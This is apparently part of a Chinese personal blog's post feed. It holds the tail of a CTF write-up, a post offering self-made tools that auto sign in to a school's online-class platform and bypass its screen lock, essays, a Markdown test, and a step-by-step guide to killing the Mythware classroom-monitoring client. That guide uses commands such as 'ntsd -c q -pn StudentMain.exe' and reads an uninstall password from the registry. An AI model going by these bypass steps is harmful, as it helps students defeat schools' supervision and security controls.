+<p><img src="https://s2.loli.net/2023/11/12/td8NFR6Em274qV5.png" alt="63b42278a01d13f8e6396d76faf10d58.png"></p>
+<blockquote>
+<p>插件 –&gt; 中文搜索引擎 –&gt; 智能模式</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2023/11/12/FeNVmaLGxd3tupc.png" alt="a22886d551e69f4c580106ee93c55856.png"></p>
+<p>搜索完成后双击运行附件一开始看到的文本 <code>点我就送 flag 噢</code> 开始调试。</p>
+<p><img src="https://s2.loli.net/2023/11/12/ueR2YOjBn9DWXZf.png" alt="d59d7d023090596cdc5f52beca311e00.png"></p>
+<p>看到下面几行不远处有一个关键字 <code>mov</code> 是不是很像移动按钮命令的 <code>move</code> 。我们右键这个语句。</p>
+<blockquote>
+<p>二进制 –&gt; 用 NOP 填充</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2023/11/12/2IBrisatxb5qTmJ.png" alt="d4427211920b15baa0ac42e8b5c102fb.png"></p>
+<p>然后调试运行，再把鼠标移上去，发现按钮不再乱跑了，点一下，程序将 flag 文件写入当前目录下的 click_me_flag.txt 文件里了。</p>
+<p><img src="https://s2.loli.net/2023/11/12/NUSvP8JayZKCAlL.png" alt="cc5040d31c3d45f6d00b5f032e004f25.png"></p>
+<p>打开该文件获得 flag <code>redrock&#123;y0u_c1icked_0n_me_haha&#125;</code> 。</p>
+<p>还有一种思路是用易语言写脚本，获取按钮控件句柄，直接对其发消息实现按下按钮的效果，理论上可行，但是我没去试。</p>
+<h3 id="EasyRE"><a href="#EasyRE" class="headerlink" title="EasyRE"></a>EasyRE</h3><p>绝对的非预期，直接上工具 <code>破空_flag查找工具3.5</code></p>
+<p>查找目标填入几个 flag 头（不区分大小写） <code>flag,redrock,0xFA</code> ，勾选关键字编码，把附件丢进去，直接获得 flag <code>Redrock&#123;w31c0m3_70_r3dr0ck&#125;</code> ，果然很 easy 呢（bushi）。</p>
+<p><img src="https://s2.loli.net/2023/11/12/zTmadgJEcYG4S9X.png" alt="3a405cb47dbe5668cd1d350ff66d3301.png"></p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Oceaner黑客少年传奇-烈焰序章"><a href="#Oceaner黑客少年传奇-烈焰序章" class="headerlink" title="Oceaner黑客少年传奇-烈焰序章"></a>Oceaner黑客少年传奇-烈焰序章</h3><p>用 nc 连接靶机，可以输入命令，先 <code>ls</code> 扫下当前目录，返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn</span><br><span class="line">你想干嘛！？</span><br></pre></td></tr></table></figure>
+
+<p>发现 flag 关键字，但靶机断开连接了，重新连接下，用 <code>cat flag</code> 读文件得到 flag 。</p>
+<p><img src="https://s2.loli.net/2023/11/12/U7ZBIKsVgYRCaum.png" alt="261b45399c9845df8bd2c4de9b687cee.png"></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>技术</tag>
+        <tag>CTF</tag>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极递云课Windows版辅助套件（应官方要求已经停止开放下载）</title>
+    <url>/2022/11/01/%E6%9E%81%E9%80%92%E4%BA%91%E8%AF%BEWindows%E7%89%88%E8%BE%85%E5%8A%A9%E5%A5%97%E4%BB%B6/gtClass-Auto/</url>
+    <content><![CDATA[<h1 id="极递云课-自动签到-amp-解除锁屏-amp-显示教师控件-amp-自动上课并切换课堂"><a href="#极递云课-自动签到-amp-解除锁屏-amp-显示教师控件-amp-自动上课并切换课堂" class="headerlink" title="极递云课 自动签到 &amp; 解除锁屏 &amp; 显示教师控件 &amp; 自动上课并切换课堂"></a>极递云课 自动签到 &amp; 解除锁屏 &amp; 显示教师控件 &amp; 自动上课并切换课堂</h1><p><code>“极递云课第三方登录器”仅 合肥皖智中学 可用（不知道莲花校区行不行），其他学校软件会无法正常登陆</code><br><code>“极递云课小助手”普遍适用</code></p>
+<span id="more"></span>
+<p>软件可能被杀毒软件报毒，但这是我亲手写的，不包含病毒（我的能力还写不出来），请放心添加信任。</p>
+<h2 id="套件安装教程"><a href="#套件安装教程" class="headerlink" title="套件安装教程"></a>套件安装教程</h2><h3 id="官方启动器-安装"><a href="#官方启动器-安装" class="headerlink" title="官方启动器 安装"></a>官方启动器 安装</h3><p>到<a href="https://hfwzzx.gtclass.cn/">极递云课合肥皖智中学专网</a>下载PC版启动器。<br>并将其安装到<code>默认路径</code>。</p>
+<h3 id="极递云课小助手-安装"><a href="#极递云课小助手-安装" class="headerlink" title="极递云课小助手 安装"></a>极递云课小助手 安装</h3><p>下载<a href="https://dtx-qaq.lanzoul.com/iSDtN0ey2n2b">极递云课小助手安装器</a>，打开后，点击安装按钮，提示安装成功即可。<br>此软件包含 <strong>自动签到 &amp; 解除锁屏 &amp; 教师控件</strong> 功能，教师控件可让你看到同学进出课堂，并且能在老师的文档上画画。软件运行时，可用快捷键 <strong>F6</strong> 打开解除锁屏界面， <strong>F7</strong> 使用显示教师控件功能。</p>
+<p>安装成功后，无论是从 官方网站 手动进入课堂还是通过 极递云课第三方登录器 自动进入课堂，都可以自动同时运行 极递云课小助手，无需再手动操作打开。</p>
+<h3 id="极递云课第三方登录器-安装"><a href="#极递云课第三方登录器-安装" class="headerlink" title="极递云课第三方登录器 安装"></a>极递云课第三方登录器 安装</h3><p><code>这个软件新鲜出炉，未经长久测试，可能有重大Bug</code></p>
+<p>下载<a href="https://dtx-qaq.lanzoul.com/iFOFd0eyqtdc">极递云课第三方登录器</a>，无需安装，打开即可使用，打开后输入账号密码并勾选自动登录，程序会获取当天课表(如果当天没课，则会获取下一次有课那天的课表)并<strong>自动启动课堂</strong>和<strong>切换课堂</strong></p>
+<p>如果你甚至懒得关闭进入课堂后自动打开的音视频设置界面，可以拿弹窗拦截软件拦截（火绒、360都有）</p>
+<p>如果需要开机自动运行，<del>我懒，没写开机启动功能</del>请自行按如下方法操作：</p>
+<p>1.桌面上右键<strong>极递云课第三方登录器</strong>图标，新建快捷方式。 </p>
+<p>2.按 Win + R 键打开运行窗口，输入指令<code>shell:startup</code>，并将第一步的快捷方式拉入打开的文件夹。可能会有杀软拦截，允许并添加信任即可。</p>
+<p>以上便完成全部安装过程，可以更愉快的上网课啦~</p>
+<h3 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h3><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
+    <iframe src="//player.bilibili.com/player.html?aid=1451683095&bvid=BV17i421o79Z&cid=1463285801&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe>
+</div>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>技术</tag>
+        <tag>极递云课</tag>
+        <tag>网课</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>高考很大，生活更大</title>
+    <url>/2021/06/07/%E9%AB%98%E8%80%83%E5%BE%88%E5%A4%A7%EF%BC%8C%E7%94%9F%E6%B4%BB%E6%9B%B4%E5%A4%A7/The%20National%20College%20Entrance%20Examination%20of%202021/</url>
+    <content><![CDATA[<h6 id="——写在高考日"><a href="#——写在高考日" class="headerlink" title="——写在高考日"></a>——写在高考日</h6><span id="more"></span>
+<p>写给考生和未来的自己：</p>
+<p>人的畏惧来源大致有二：一是过去的不可更改性；二是未来的不可预知性。而高考正好占了这两点。过去不可更改：你是学霸也好，学渣也罢，无论你复习得怎么样都成了定数。“当天上星河转命已定盘，待绝笔墨痕干宿敌已来犯”，高考这个宿敌来了。被高考煎熬了许久，也该向这个死敌宣战了。不论你高考的目的如何，不论你为了谁，为了什么而踏进考场，这都是一场与你自己的较量，既然选择了远方，便只顾风雨兼程，愿你们前程似锦，未来可期。</p>
+<p>多年之后总有一个瞬间，你会意识到高考也许是你此生最简单的一场考试。因为有太多人和你一样在乎你的这场考试，甚至比你更在乎。你可以在十字路口，单凭一张准考证拦下警车。在那个时刻，单凭「高考」两个字，你可以在路上一路畅行无碍。那时你根本想象不到，接下来的人生有多少「考试」要独自面对。你会碰上无数次来不及和赶不上的时刻，你会发现将那两个字替换成任何别的情景，心仪工作的面试，心爱女孩的约会，除非关乎生死的大事，否则都不会再有这样的魔力。</p>
+<p>据说高考阅卷老师批阅作文，平均时间是一篇 40 秒。曾经人们为此愤愤，觉得在这样短的时间内做决断真是草率。可是接下来的人生中，你会发现 40 秒的时间，简直是尊重。你会用多长时间决定，一个观点你是赞同还是反对？你会用多长时间决定，一本书要不要买下来？你会用多长时间决定，投奔一家公司？你会用多长时间决定，一个人值不值得做你的朋友？你会用多长时间决定，奔向或逃离一座城市？你会用多长时间决定，爱上一个人，然后闯进 ta 的生活？够 40 秒吗？</p>
+<p>在高考之前，人生似乎是一条单行线，几乎所有的人都要排着队，从一条路上穿过。高考之后，是穿过山谷进入平原。眼前有无数方向，以前排成一队的所有人，踏上了不同的小径。路，越来越多，与你结伴的人，越来越少。你曾经痛恨学校安排的课程，老师布置的作业，枯燥乏味的课本和成堆的辅导书，和那个唯一的目标——高考。你想的最多的是，高考过后，你的人生你来做主。突然有一天，你发现你真的有了掌控权。你决定自己每天要学些什么，你决定自己每天要做些什么，你决定你的目标是什么。你发现，这一切原来没有那么简单。你让自己不堪重负，或是无所事事，找来找去总是找不到那个平衡点。这时你又开始怀念，那些曾经安排好的课程，安排好的作业，安排好的目标，安排好的日子。你花了更多的时间，花了更多的金钱，只为再给自己找一个老师，找一段「安排」。到底是只有唯一答案的考卷更难，还是满是正确答案的人生更难？这道题，本身就很难。</p>
+<p>你要忍，忍到春暖花开；你要走，走到灯火通明；你要看过世界辽阔，再评判是好是坏；你要卯足劲变好，再旗鼓相当站在不敢想象的人身边；你要变成想象中的样子，这件事，一步都不能让。上人生的旅途罢，前途很远，也很暗。然而不要怕，不怕的人的面前才有路。</p>
+<p>高考很大，生活更大。</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E9%AB%98%E8%80%83%E5%BE%88%E5%A4%A7%EF%BC%8C%E7%94%9F%E6%B4%BB%E6%9B%B4%E5%A4%A7/%E8%B7%83%E9%BE%99%E9%97%A8.jpg" alt="跃龙门"></p>
+]]></content>
+      <categories>
+        <category>文章</category>
+      </categories>
+      <tags>
+        <tag>高考</tag>
+        <tag>文章</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2021新年快乐！</title>
+    <url>/2021/01/01/2021%E6%96%B0%E5%B9%B4/2021%20new%20year/</url>
+    <content><![CDATA[<h1 id="新-年-快-乐！"><a href="#新-年-快-乐！" class="headerlink" title="新 年 快 乐！"></a>新 年 快 乐！</h1><p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/2021%E6%96%B0%E5%B9%B4/2021%E6%96%B0%E5%B9%B4.png" alt="新年好"></p>
+<p><code>所求皆如愿,所行化坦途,多喜乐,长安宁.</code></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>2020即将过去</title>
+    <url>/2020/12/31/2020%E7%BA%AA%E5%BF%B5/2020%E7%BA%AA%E5%BF%B5/</url>
+    <content><![CDATA[<h1 id="2020："><a href="#2020：" class="headerlink" title="2020："></a>2020：</h1><p>2020年元旦，UPUPOO转让暴毙</p>
+<p>年初《我的三体章北海传》播出</p>
+<span id="more"></span>
+<p>第一次刷脸支付<br><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/2020%E7%BA%AA%E5%BF%B5/%E5%88%B7%E8%84%B8.png" alt="第一次刷脸支付"></p>
+<p>第一个个人网站<br><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/2020%E7%BA%AA%E5%BF%B5/%E4%B8%AA%E7%BD%91.png" alt="第一个个人网站"></p>
+<p>第一次上手写程序（太久没更新，现在“过期”了，小牛接手后拿源码改了滑动签到）<br><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/2020%E7%BA%AA%E5%BF%B5/%E7%BC%96%E7%A8%8B.png" alt="第一次上手写程序"></p>
+<p>2020.4.3老番茄成为B站第一个1000万粉UP主</p>
+<p>黎巴嫩政府辞职</p>
+<p>鸽了1年的2077终于在年底发售</p>
+<p>还有那一塌糊涂的中考</p>
+<p>Adobe Flash一路走好</p>
+<p>……</p>
+<p>随便想一想，就有这么多事啊，有好也有坏<br>希望明年能如意吧<br><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/2020%E7%BA%AA%E5%BF%B5/%E5%B0%8F%E5%8D%81%E7%A5%9D%E7%A6%8F.png" alt="小十的话"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>关于极域电子教室</title>
+    <url>/2020/10/17/%E5%85%B3%E4%BA%8E%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/JIYU/</url>
+    <content><![CDATA[<h1 id="阅前提示"><a href="#阅前提示" class="headerlink" title="阅前提示:"></a>阅前提示:</h1><p>1.在<strong>断连状态</strong>下将<strong>无法</strong>接收教师端发出的文件</p>
+<p>2.在老师讲重点的时候仍然要<strong>注意听讲</strong></p>
+<p>3.在<strong>较长时间</strong>后方法可能会<strong>失效</strong></p>
+<p>4.大部分机房都有<strong>冰点还原精灵</strong>，可以<strong>随便造</strong></p>
+<span id="more"></span>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>让信息技术课变得索然无味的极域电子教室↓↓↓</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E4%B8%BB%E8%A7%92.webp" alt="极域电子教室"></p>
+<p>而且一般手段<strong>无法解决</strong>它</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E6%90%9E%E4%B8%8D%E5%AE%9A.webp" alt="无法通过任务管理器直接终止进程"></p>
+<hr>
+<h2 id="1-方法一·最常规"><a href="#1-方法一·最常规" class="headerlink" title="1.方法一·最常规"></a>1.方法一·最常规</h2><blockquote>
+<p>此方法在已经受到教师控制的电脑上无法操作</p>
+</blockquote>
+<p>首先<strong>Win+R</strong>打开-运行-输入<code>services.msc</code></p>
+<p>然后按<strong>Enter回车键</strong>打开本地服务</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1.webp" alt="本地服务界面"></p>
+<p>找到<strong>S</strong>开头的一系列服务</p>
+<p>在其中找到<strong>Student Service</strong>服务，右键它，点击属性</p>
+<p>(我的笔记本没有极域电子教室，就用另一个服务<strong>代替</strong>演示一下)</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4.webp" alt="具体步骤图示"></p>
+<p>随后出现下图的对话框，<strong>等待</strong>系统完成操作即可</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C.webp" alt="系统操作"></p>
+<p>然后就是熟悉的<strong>Ctrl+Shift+Esc</strong>打开<strong>任务管理器</strong></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8.webp" alt="任务管理器"></p>
+<p>在进程中找到<strong>S</strong>开头的一系列进程</p>
+<p>在其中找到<strong>StudentMain.exe</strong>进程，右键它，点击<strong>结束进程</strong></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B.webp" alt="目标进程"></p>
+<p>即可脱离老师的<strong>监视与控制</strong></p>
+<hr>
+<h2 id="2-方法二·NTSD"><a href="#2-方法二·NTSD" class="headerlink" title="2.方法二·NTSD"></a>2.方法二·NTSD</h2><blockquote>
+<p>此方法在已受到教师控制的电脑上无法操作</p>
+</blockquote>
+<p><strong>Xp</strong>可直接使用，<strong>Win7及以上</strong>要使用U盘或者网络拷入ntsd.exe文件(拷入<strong>C:\Windows\System32</strong>)</p>
+<p>上一步完成后<strong>Win+R</strong>打开-运行-，输入<code>cmd</code>然后按<strong>Enter回车键</strong></p>
+<p>在弹出的Dos命令框内输入<code>ntsd -c q -pn StudentMain.exe</code></p>
+<p>大部分情况下可行，运行完就已断连</p>
+<hr>
+<h2 id="3-方法三·网络"><a href="#3-方法三·网络" class="headerlink" title="3.方法三·网络"></a>3.方法三·网络</h2><blockquote>
+<p>Tips:<br>   1.如果有聪明的老师设置了断网锁屏那还是省省吧<br>   2.云机房这属于自杀行为</p>
+</blockquote>
+<h5 id="拔网线"><a href="#拔网线" class="headerlink" title="拔网线"></a>拔网线</h5><p>最<strong>暴力快捷</strong>的方法</p>
+<p>弯腰<strong>拔掉</strong>主机后闪着光的<strong>网线</strong>即可<strong>脱离控制</strong></p>
+<h5 id="禁用网络"><a href="#禁用网络" class="headerlink" title="禁用网络"></a>禁用网络</h5><p>比拔网线<strong>优雅一点</strong></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E6%96%B9%E6%B3%95%E6%B3%A8%E9%87%8A.webp" alt="方法注释"></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E6%AD%A5%E9%AA%A41.webp" alt="步骤1"></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E6%AD%A5%E9%AA%A42.webp" alt="步骤2"></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E6%AD%A5%E9%AA%A43.webp" alt="步骤3"></p>
+<ul>
+<li>关闭网络的<strong>方法很多</strong>，可以自行查找</li>
+</ul>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><strong>脱离控制</strong>但是你也<strong>上不了网</strong>了、、、如果你喜欢玩扫雷也不错</p>
+<hr>
+<h2 id="4-方法四·找密码"><a href="#4-方法四·找密码" class="headerlink" title="4.方法四·找密码"></a>4.方法四·找密码</h2><p>这个方法<strong>年事已高</strong>可能已经<strong>失效</strong>了</p>
+<p><strong>Win+R</strong>打开-运行-，输入<code>regedit</code>然后按<strong>Enter回车键</strong></p>
+<p>在弹出的<strong>注册表编辑器</strong>找到目录：HKEY_LOCAL_MACHINE\SOFTWARE\TopSomain\e-Learning Class Standard\1.00\</p>
+<p>网上有很多不同版本的<strong>注册表目录</strong>，可以自行百度查找</p>
+<p>再找一找名称是<strong>uninstallpasswd</strong>的注册表项，后面有一个值是passwdXXXXXX，那么passwd后面的XXXXXX就是这台电脑的<strong>极域电子教室密码</strong></p>
+<p>如果你<strong>没找到</strong>，或者是看到一堆你不认识的<strong>字符串</strong>，那就放弃这个方法吧</p>
+<p>找到密码后右键状态栏里的极域电子教室，点击设置，输入密码，点击确定，然后即可<strong>为所欲为</strong></p>
+<hr>
+<h2 id="5-方法五·安全模式-网络安全模式"><a href="#5-方法五·安全模式-网络安全模式" class="headerlink" title="5.方法五·安全模式/网络安全模式"></a>5.方法五·安全模式/网络安全模式</h2><blockquote>
+<p>Tips:<br>   网络安全模式<strong>可能</strong>在<strong>已被控制</strong>的电脑上仍<strong>有效</strong>(未经测试)<br>   有的机房里面的电脑使用了<strong>软件保护卡</strong>，安全模式和PE都无法使用</p>
+</blockquote>
+<h5 id="网络安全模式"><a href="#网络安全模式" class="headerlink" title="网络安全模式"></a>网络安全模式</h5><p>在<strong>启动</strong>电脑的时候不停地按下<strong>F8</strong>或按住<strong>Ctrl</strong>进入选择项</p>
+<p>用’↑’’↓’键选择<strong>网络安全模式</strong>按回车进入(注意是<strong>网络安全模式</strong>，<strong>实在不行</strong>再使用<strong>啥也干不了</strong>的<strong>安全模式</strong>)</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E9%80%89%E6%8B%A9%E9%A1%B9%E7%95%8C%E9%9D%A2.webp" alt="选择项界面"></p>
+<p>若是不放心可<strong>重复方法一</strong>关闭网络安全模式下的学生端</p>
+<hr>
+<h2 id="6-方法六·Taskkill"><a href="#6-方法六·Taskkill" class="headerlink" title="6.方法六·Taskkill"></a>6.方法六·Taskkill</h2><blockquote>
+<p>Tips：此方法仍需要<strong>ntsd</strong></p>
+</blockquote>
+<p>又是熟悉的<strong>Win+R</strong>打开-运行-，输入<code>cmd</code>然后按<strong>Enter回车键</strong></p>
+<p>这次输入<code>taskkill /im studentmain.exe /f</code></p>
+<p>如果成功了就<strong>直接关闭</strong>了学生端</p>
+<p>但是大部分情况有<strong>防杀进程</strong></p>
+<p>此时会显示下图</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF.webp" alt="错误信息"></p>
+<p>记下后面的<strong>pid码</strong></p>
+<p>继续输入<code>ntsd /p PID</code>将<strong>PID</strong>改为刚才记下的<strong>pid码</strong></p>
+<p>然后再回车，即完成此方法</p>
+<hr>
+<h2 id="7-方法七·利用Windows关机特色"><a href="#7-方法七·利用Windows关机特色" class="headerlink" title="7.方法七·利用Windows关机特色"></a>7.方法七·利用Windows关机特色</h2><p>开机后在桌面新建一个文本文档</p>
+<p>随便写点东西，<strong>不保存</strong>，然后按<strong>关机键</strong></p>
+<p>Windows系统会<strong>开始关闭程序</strong>，但是由于<strong>文本文档没保存</strong>，会显示一个可以<strong>取消关机</strong>的界面(考验手速)，如果你点到了，那么恭喜，一般情况下学生端应该<strong>已经关闭</strong>，但是此时你的<strong>电脑没关闭</strong>，开始<strong>快乐</strong>吧</p>
+<hr>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>若是打开浏览器显示<strong>此网页已被锁定</strong></p>
+<p>大部分情况是部分<strong>特定域名被屏蔽</strong></p>
+<p>建议自己<strong>背一两个搜索引擎域名</strong>方便使用</p>
+<blockquote>
+<p>网络上仍有许多方法关闭学生端<br>欢迎补充</p>
+</blockquote>
+<hr>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>祝大家国庆中秋双节快乐！</p>
+<ul>
+<li><code>时逢华诞玉轮圆，双喜临门不夜天</code></li>
+</ul>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E6%9E%81%E5%9F%9F%E7%94%B5%E5%AD%90%E6%95%99%E5%AE%A4/%E5%9B%BD%E5%BA%86%E4%B8%AD%E7%A7%8B%E5%BF%AB%E4%B9%90.webp" alt="国庆中秋快乐"></p>
+<hr>
+<p><a href="https://www.bilibili.com/read/cv7800202">在Bilibili阅读本文</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>技术</tag>
+        <tag>极域电子教室</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MarkDown测试</title>
+    <url>/2020/10/07/MarkDown/MarkDown/</url>
+    <content><![CDATA[<p>本文章用于测试MarkDown效果</p>
+<span id="more"></span>
+<h1 id="MarkDown"><a href="#MarkDown" class="headerlink" title="MarkDown"></a>MarkDown</h1><p>Text can be <strong>bold</strong>, <em>italic</em>, <del>strikethrough</del> or <code>keyword</code>.</p>
+<p><a href="https://www.bilibili.com/">Link to another page</a>.</p>
+<p>There should be whitespace between paragraphs.</p>
+<p>There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.</p>
+<h1 id="Header-1"><a href="#Header-1" class="headerlink" title="Header 1"></a>Header 1</h1><p>This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.</p>
+<h2 id="Header-2"><a href="#Header-2" class="headerlink" title="Header 2"></a>Header 2</h2><blockquote>
+<p>This is a blockquote following a header.</p>
+<p>When something is important enough, you do it even if the odds are not in your favor.</p>
+</blockquote>
+<h3 id="Header-3"><a href="#Header-3" class="headerlink" title="Header 3"></a>Header 3</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Javascript code with syntax highlighting.</span></span><br><span class="line"><span class="keyword">var</span> fun = <span class="keyword">function</span> <span class="title function_">lang</span>(<span class="params">l</span>) &#123;</span><br><span class="line">  dateformat.<span class="property">i18n</span> = <span class="built_in">require</span>(<span class="string">&#x27;./lang/&#x27;</span> + l)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ruby code with syntax highlighting</span></span><br><span class="line"><span class="title class_">GitHubPages</span><span class="symbol">:</span><span class="symbol">:Dependencies</span>.gems.each <span class="keyword">do</span> |<span class="params">gem, version</span>|</span><br><span class="line">  s.add_dependency(gem, <span class="string">&quot;= <span class="subst">#&#123;version&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Header-4"><a href="#Header-4" class="headerlink" title="Header 4"></a>Header 4</h4><ul>
+<li>  This is an unordered list following a header.</li>
+<li>  This is an unordered list following a header.</li>
+<li>  This is an unordered list following a header.</li>
+</ul>
+<h5 id="Header-5"><a href="#Header-5" class="headerlink" title="Header 5"></a>Header 5</h5><ol>
+<li> This is an ordered list following a header.</li>
+<li> This is an ordered list following a header.</li>
+<li> This is an ordered list following a header.</li>
+</ol>
+<h6 id="Header-6"><a href="#Header-6" class="headerlink" title="Header 6"></a>Header 6</h6><table>
+<thead>
+<tr>
+<th align="left">head1</th>
+<th align="left">head two</th>
+<th align="left">three</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">ok</td>
+<td align="left">good swedish fish</td>
+<td align="left">nice</td>
+</tr>
+<tr>
+<td align="left">out of stock</td>
+<td align="left">good and plenty</td>
+<td align="left">nice</td>
+</tr>
+<tr>
+<td align="left">ok</td>
+<td align="left">good <code>oreos</code></td>
+<td align="left">hmm</td>
+</tr>
+<tr>
+<td align="left">ok</td>
+<td align="left">good <code>zoute</code> drop</td>
+<td align="left">yumm</td>
+</tr>
+</tbody></table>
+<h3 id="There’s-a-horizontal-rule-below-this"><a href="#There’s-a-horizontal-rule-below-this" class="headerlink" title="There’s a horizontal rule below this."></a>There’s a horizontal rule below this.</h3><hr>
+<h3 id="Here-is-an-unordered-list"><a href="#Here-is-an-unordered-list" class="headerlink" title="Here is an unordered list:"></a>Here is an unordered list:</h3><ul>
+<li>  Item foo</li>
+<li>  Item bar</li>
+<li>  Item baz</li>
+<li>  Item zip</li>
+</ul>
+<h3 id="And-an-ordered-list"><a href="#And-an-ordered-list" class="headerlink" title="And an ordered list:"></a>And an ordered list:</h3><ol>
+<li> Item one</li>
+<li> Item two</li>
+<li> Item three</li>
+<li> Item four</li>
+</ol>
+<h3 id="And-a-nested-list"><a href="#And-a-nested-list" class="headerlink" title="And a nested list:"></a>And a nested list:</h3><ul>
+<li>level 1 item<ul>
+<li>level 2 item</li>
+<li>level 2 item<ul>
+<li>level 3 item</li>
+<li>level 3 item</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>level 1 item<ul>
+<li>level 2 item</li>
+<li>level 2 item</li>
+<li>level 2 item</li>
+</ul>
+</li>
+<li>level 1 item<ul>
+<li>level 2 item</li>
+<li>level 2 item</li>
+</ul>
+</li>
+<li>level 1 item</li>
+</ul>
